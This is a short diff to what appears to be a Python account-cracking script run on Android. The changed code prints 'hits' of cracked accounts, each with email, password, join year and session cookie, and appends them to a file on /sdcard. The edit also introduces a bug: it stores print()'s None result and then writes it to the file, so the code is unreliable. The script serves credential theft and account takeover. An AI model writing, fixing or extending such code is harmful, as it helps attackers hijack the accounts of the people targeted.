@@ -597,15 +597,13 @@ def gxds_files(uid, pxss):
                         for key, value in session.cookies.get_dict().items()
                     ]
                 )
-                xcki = coki.split("sb=")[1]
-                print(f"""{lgr} -- [GXDS HITS] --
+                output = print(f"""{lgr} -- [GXDS HITS] --
  EMAIL  : {uid} 
  PASS   : {ps} 
  JOINED : {yrs}
  COOKIE : {coki}
 """)
-                open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
-                open("/sdcard/gxds-cookies.txt", "a").write(coki + "\n")
+                open("/sdcard/gxds-hits.txt", "a").write(output+ "\n")
                 oks.append(uid)
                 break
             else:
